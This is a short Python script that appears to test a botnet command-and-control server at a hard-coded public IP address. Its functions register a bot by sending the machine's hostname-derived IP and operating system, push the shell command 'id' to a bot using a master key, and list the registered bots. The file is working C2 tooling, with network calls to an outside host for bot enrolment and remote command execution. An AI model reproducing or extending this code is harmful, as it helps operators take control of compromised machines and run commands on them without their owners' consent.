import requests
import socket
import os 
import platform 

registerkey = "registerkey"

def test_firstcontact():
    url = 'http://138.197.74.47:5000/firstcontact'
    data = {'firstcontactkey': 'firstcontact'}
    
    res = requests.post(url, data=data)

    print ("[+] Testing firstcontact... ")
    print (res.text + '\n')

def test_register():
    url = 'http://138.197.74.47:5000/register'

    registerkey = "registerkey"
    hostname = socket.gethostname()
    host_ip = socket.gethostbyname(hostname)

    if "Linux" in platform.platform():
        host_os = 'Nix'
    elif "Windows" in platform.platform():
        host_os = 'Windows'
    else:
        print("[-] Unidentifiable OS type")

    data = {'registerkey': registerkey, 'ip': host_ip, 'os': host_os}

    res = requests.post(url, data=data)

    print ("[+] Testing register... ")
    print (res.text + '\n')

def test_botpush(bot_id):
    url = 'http://138.197.74.47:5000/bot/' + bot_id + '/push'

    masterkey = 'masterkey'
    cmd = 'id'

    data = { 'masterkey': masterkey, 'cmd': cmd }

    res = requests.post(url, data=data)

    print ("[+] Testing bot push command... ")
    print (res.text + '\n')


def test_dummyregister(ip):
    url = 'http://138.197.74.47:5000/register'

    ip = ip
    os = 'Nix'

    data = {'registerkey': registerkey, 'ip': ip, 'os': os}

    res = requests.post(url, data=data)

    print("[+] Testing Register...")
    print(res.text)

def test_botlist():
    url = 'http://138.197.74.47:5000/bot/list'

    res = requests.get(url)

    print(res.text)

def main():
    test_firstcontact()

    test_register()

    #test_dummyregister('127.0.0.1')
    #test_dummyregister('127.0.0.2')
    #test_dummyregister('127.0.0.3')
    #test_dummyregister('127.0.0.4')
    #test_dummyregister('127.0.0.5')

    #test_botpush('3')

    test_botlist()

if __name__ == '__main__':
    main() 